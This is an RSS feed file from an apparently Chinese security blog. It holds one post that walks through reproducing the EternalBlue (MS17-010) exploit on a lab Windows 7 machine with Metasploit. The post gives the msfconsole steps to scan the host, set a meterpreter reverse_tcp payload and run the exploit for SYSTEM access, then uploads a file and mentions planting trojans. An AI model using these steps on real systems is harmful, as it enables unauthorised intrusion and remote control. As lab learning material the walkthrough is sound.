@@ -1,0 +1,91 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Blog • Posts by &#34;windows&#34; category</title>
+        <link>https://vvwwvv.cn</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Sun, 17 Sep 2023 08:39:56 +0800</pubDate>
+        <lastBuildDate>Sun, 17 Sep 2023 08:39:56 +0800</lastBuildDate>
+        <category>Java</category>
+        <category>pwn</category>
+        <category>二进制</category>
+        <category>C语言</category>
+        <category>Linux</category>
+        <category>ret2csu</category>
+        <category>fastbin.attack</category>
+        <category>ctf</category>
+        <category>nc</category>
+        <category>系统调用</category>
+        <category>windows</category>
+        <category>渗透</category>
+        <item>
+            <guid isPermalink="true">https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+            <title>Windows7永恒之蓝漏洞复现</title>
+            <link>https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+            <category>windows</category>
+            <category>渗透</category>
+            <pubDate>Sun, 17 Sep 2023 08:39:56 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;利用msf渗透攻击win7永恒之蓝漏洞-ms17-010&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用msf渗透攻击win7永恒之蓝漏洞-ms17-010&#34;&gt;#&lt;/a&gt; 利用 msf 渗透攻击 win7（永恒之蓝漏洞 ms17-010）&lt;/h1&gt;
+&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;永恒之蓝是指 2017 年 4 月 14 日晚，黑客团体 Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含 “永恒之蓝” 工具，“永恒之蓝” 利用 Windows 系统的 SMB 漏洞可以获取系统最高权限。5 月 12 日，不法分子通过改造 “永恒之蓝” 制作了 wannacry 勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。&lt;/p&gt;
+&lt;p&gt;存在漏洞的主机，只需要开放 445 端口即可被攻击，获取系统最高权限&lt;/p&gt;
+&lt;h2 id=&#34;环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h2&gt;
+&lt;p&gt;kali  ip：192.168.232.129&lt;/p&gt;
+&lt;p&gt;windows7   ip：192.168.232.131&lt;/p&gt;
+&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h2&gt;
+&lt;p&gt;Metasploit Framework (MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以 “可以黑掉整个宇宙” 之名。刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写的了。在 kali 中，自带了 Metasploit 工具。&lt;/p&gt;
+&lt;h2 id=&#34;ms17-010漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ms17-010漏洞复现&#34;&gt;#&lt;/a&gt; ms17-010 漏洞复现&lt;/h2&gt;
+&lt;p&gt;1. 安装 win7 并查看本机 ip&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfLpc9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;kali 利用 nmap 扫描 win7ip&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfLEtO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现开启了 445 端口，利用该端口进行攻击&lt;/p&gt;
+&lt;p&gt;2. 启动 msf 进行漏洞探测&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#利用命令&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	msfconsole  &lt;span class=&#34;token comment&#34;&gt;#进入 msf&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	search ms17-010 &lt;span class=&#34;token comment&#34;&gt;#查找 msf17-010 漏洞模块&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfXXAP.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+利用 use [对应的模块序号]  命令即可查看对应漏洞模块&lt;/p&gt;
+&lt;p&gt;为了使用 &lt;code&gt;scanner&lt;/code&gt;  模块，这里我们输入  &lt;code&gt;use 3&lt;/code&gt;  接着输入 &lt;code&gt;info&lt;/code&gt;  命令来查看 ms17-010 漏洞信息&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfjnc4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来使用 &lt;code&gt;scanner&lt;/code&gt;  模块检测主机是否存在漏洞&lt;/p&gt;
+&lt;p&gt;输入命令 &lt;code&gt;show options&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfjwDA.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+ 在上面的图里可以看到 &lt;code&gt;Required&lt;/code&gt;  为是否需要参数， &lt;code&gt;yes&lt;/code&gt;  表示需要参数，若改选项对应参数为空则需要我们来输入参数&lt;/p&gt;
+&lt;p&gt;发现 &lt;code&gt;RHOST&lt;/code&gt;  参数对应为空，其参数是被攻击主机的 IP，需要我们输入&lt;/p&gt;
+&lt;p&gt;输入命令 &lt;code&gt;set rhosts 192.168.232.131&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfjIU0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再次输入 &lt;code&gt;show options&lt;/code&gt; , 可以看到已经设置好了 &lt;code&gt;RHOSTS&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfjqv4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;run&lt;/code&gt;  命令进行扫描攻击，运行结果显示可能会遭受 &lt;code&gt;ms17-010&lt;/code&gt;  攻击&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfvC8O.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;3. 漏洞利用&lt;/p&gt;
+&lt;p&gt;回到开始选择漏洞模块的地方&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfv8qs.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;输入 &lt;code&gt;use 0&lt;/code&gt;  来选择 &lt;code&gt;永恒之蓝&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfvdRU.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;输入 &lt;code&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/code&gt;  来设置 payload 的连接方式，使我们的 win7 主动发起连接，通过这种方式拿到权限&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfzV4P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来需要设置我们的攻击 ip，按顺序输入 &lt;code&gt;show options&lt;/code&gt;  和 &lt;code&gt;set rhosts 192.168.232.131&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPfzujg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接下来使用 &lt;code&gt;run&lt;/code&gt;  命令即可执行攻击&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhPESx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;出现返回的 &lt;code&gt;meterpreter&lt;/code&gt;  时我们就得到了 win7 的 system 权限&lt;/p&gt;
+&lt;p&gt;【Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，&lt;br /&gt;
+对目标系统进行更深入的渗透，如获取屏幕、上传 / 下载文件、创建持久后门等。】&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这里进行文件上传的演示&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在 kali 中创建一个文件（cumt.txt）, 编辑内容&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhAMKP.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;meterpreter&lt;/code&gt;  会话下输入命令  &lt;code&gt;upload cumt.txt c://&lt;/code&gt; , 将文件上传到 win7 主机的 C 盘下&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhAt8s.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看 win7 主机，发现文件夹中多了一个 cumt.txt 文件，内容确实是我在 kali 中写入的相同&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhAdK0.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhAraF.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过这种方式我们也可以在对应主机里写入木马并上传进行利用&lt;/p&gt;
+&lt;p&gt;到此永恒之蓝漏洞就复现完成了&lt;/p&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTMwODE5MTA=&#34;&gt;https://zhuanlan.zhihu.com/p/453081910&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4L2FydGljbGUvZGV0YWlscy8xMDQwNDQwMDI=&#34;&gt;https://blog.csdn.net/qq_44159028/article/details/104044002&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vsc29uSFkvYXJ0aWNsZS9kZXRhaWxzLzEwOTkzOTQyMA==&#34;&gt;https://blog.csdn.net/ElsonHY/article/details/109939420&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
